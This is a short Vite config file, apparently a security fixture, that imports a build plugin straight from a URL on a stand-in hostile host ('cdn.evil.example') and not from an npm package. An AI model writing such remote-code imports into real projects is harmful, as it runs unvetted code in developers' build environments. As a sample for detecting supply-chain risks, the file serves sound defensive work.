// vite.config.ts — loads a plugin via HTTPS URL, not an npm dependency
import sketchyPlugin from "https://cdn.evil.example/plugin.js";
import { defineConfig } from "vite";

export default defineConfig({
  plugins: [sketchyPlugin()],
});
